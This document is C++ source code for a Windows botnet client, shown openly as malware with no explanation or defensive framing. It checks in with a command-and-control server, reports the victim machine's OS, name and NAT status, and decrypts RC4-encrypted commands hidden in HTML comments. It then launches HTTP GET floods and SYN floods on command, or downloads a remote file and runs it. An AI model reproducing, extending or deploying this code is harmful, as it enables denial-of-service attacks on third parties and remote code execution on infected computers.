int parsecommand(string command){
    commandcount++;
	#if defined DEBUG
	  cout<<commandcount<<":"<<command<<endl;
	#endif
	int count=command.find(' ');
	string cmd[11];
	cmd[0]=command.substr(0,count);
	command=command.substr(count+1);
	if(cmd[0]=="wait"){
	     Sleep(OneMinute);
	     return 0;	
		}
	for(int i=1;i<=9;i++)
	  {
        int count=command.find(' ');
	    string tmp=command;
	    cmd[i]=tmp.substr(0,count);
	    command=command.substr(count+1);
	  }
	  if (cmd[0]=="http"){
	      HTTPGetflood( cmd[1], cmd[2]);
		  return 1;
	  }
	  else if (cmd[0]=="supersyn"){
	      skysyn( cmd[1], cmd[2], cmd[3]);
		  return 1;
	  }
	  else if(cmd[0]=="download"){
		 URLDownloadToFile(NULL,
			  cmd[1].c_str(),cmd[2].c_str(), 0, NULL);
		 if(cmd[3]=="1")
		   system(cmd[2].c_str());
		 return 1;
	  }
	  else{
		  Sleep(OneMinute);
		  return 1;
	  }
	return 1;	
	
}

int connect(int meta){ 
  sockaddr_in addr;
  SOCKET sock;
  sock=socket(AF_INET,SOCK_STREAM,0);
  if(sock==INVALID_SOCKET){
    	 Sleep(20000);
		 connect(0);
	 }
  addr.sin_family = AF_INET;
  addr.sin_port = htons(80);
  char serverip[20];
  ResolveHost(serverip,server);
  addr.sin_addr.s_addr = inet_addr(serverip);

  int conn=connect(sock,(SOCKADDR*)&addr,sizeof(SOCKADDR));
     if (conn==SOCKET_ERROR){
           Sleep(20000);
    	  connect(0);
	 }
	 string request="GET /"+loginlocation;
	 if (BotID==0){
	   int os=OSVersionCheck();
	   string winversion="unknown";
	   switch (os){
	   case 4:winversion="xp";
	  	    break;
       case 6:winversion="vista";
		    break;
	   case 7:winversion="win 7";
		    break;
	   case 2003:winversion="server 2003";
		    break;
	   default: winversion="unknown";
              break;
	   }    
       request+="?serial="+serial()
	    +"&name="+name()+"&os="+winversion+"&NAT="+NAT();
	 }
	 else
		 request+="?ID="+IntToStr(BotID);
     if(meta!=0){
         #if defined DEBUG
		   cout<<"set command to wait"<<meta<<endl;
         #endif
         request=request+"&nc="+IntToStr(rand());
	 }
	 string mode=" HTTP/1.1\r\nHost:"+server
	  +"\r\nUser-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n\r\n";
	     request=request+mode;	
        send(sock, request.c_str(), request.length(), 0);
        char temp[10000];
		int x = recv(sock, temp, 10000, 0);
		closesocket(sock);
		string command=temp;
		int count=command.find("<!--");
    	command=command.substr(count+4,string::npos);
    	count=command.find("-->",0);
		command=command.substr(0,count);
		string crypted=command;
		int iLEN=command.length();
		command=RC4(command.c_str(),iLEN,cryptpassword.c_str());
		command=command.substr(0,iLEN);
		if(command.substr(0,3) == "id="){
          BotID=Str2Int(command.substr(3));
		  return 0;
		}
        return parsecommand(command);
}
